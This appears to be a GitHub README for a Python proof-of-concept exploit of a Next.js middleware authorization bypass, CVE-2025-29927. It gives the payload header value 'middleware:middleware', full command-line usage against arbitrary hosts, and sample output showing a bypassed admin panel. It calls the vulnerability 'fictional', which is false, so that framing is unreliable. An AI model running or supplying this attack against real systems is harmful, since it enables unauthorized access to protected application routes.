# PoC for Next.js Middleware Bypass (CVE-2025-29927)

[![Python Version](https://img.shields.io/badge/python-3.7%2B-blue.svg)](https://www.python.org/)
[![Status](https://img.shields.io/badge/status-active-brightgreen.svg)]()

This is a **proof-of-concept** for a **fictional** Next.js middleware bypass vulnerability (CVE-2025-29927). Use **only** for educational and authorized security research.

---

## 🚀 Features

| Feature             | Description                                                       |
| ------------------- | ----------------------------------------------------------------- |
| ✨ Color & Verbose   | Color-coded output; `-v` for detailed debug logs.                 |
| 📦 OOP Structure    | Class-based design for clarity and maintainability.               |
| 🌐 Proxy Support    | Route traffic through HTTP(S) proxies via `--proxy`.              |
| 🍪 Session Handling | Persistent `requests.Session` for cookies & connection reuse.     |
| 🚦 Redirect Control | No-follow-redirect by default; clearly detects pass vs. fail.     |
| 🛠 Custom Headers   | Override `User-Agent`, `x-middleware-subrequest`, or add headers. |

---

## ⚡ Installation

```bash
# Clone repository
git clone https://github.com/your-username/nextjs-middleware-poc.git
cd nextjs-middleware-poc

# (Optional) Create virtual environment
python3 -m venv .venv
source .venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

> **Requires** Python 3.7+

---

## 🎯 Usage

```bash
python poc.py [options] <host>[:port]
```

| Option                      | Description                                                               |
| --------------------------- | ------------------------------------------------------------------------- |
| `-p, --path PATH`           | Protected route path (default: `/admin`)                                  |
| `-s, --scheme {http,https}` | Protocol (default: `http`)                                                |
| `--header HEADER`           | `x-middleware-subrequest` header value (default: `middleware:middleware`) |
| `-ua, --user-agent AGENT`   | Custom `User-Agent` (default: `Mozilla/5.0`)                              |
| `--proxy PROXY`             | HTTP(S) proxy URL (e.g., `http://127.0.0.1:8080`)                         |
| `-v, --verbose`             | Enable debug output                                                       |
| `-h, --help`                | Show this help message                                                    |

---

## 🔍 Examples

### 1. Basic Test

```bash
python poc.py localhost:3000
```

### 2. HTTPS & Custom Path

```bash
python poc.py example.com -s https -p /dashboard
```

### 3. Proxy & Verbose

```bash
python poc.py internal-app:8080 --proxy http://127.0.0.1:8080 -v
```

---

## ✅ Expected Output

**Success**

```
[*] Target URL: http://localhost:3000/admin
[+] SUCCESS: Middleware bypassed — access granted!
--- Response Snippet ---
<!DOCTYPE html><html>…<title>Admin Panel</title>…
```

**Failure**

```
[*] Target URL: http://localhost:3000/admin
[-] FAIL: Access denied by middleware (302 Redirect)
```

---
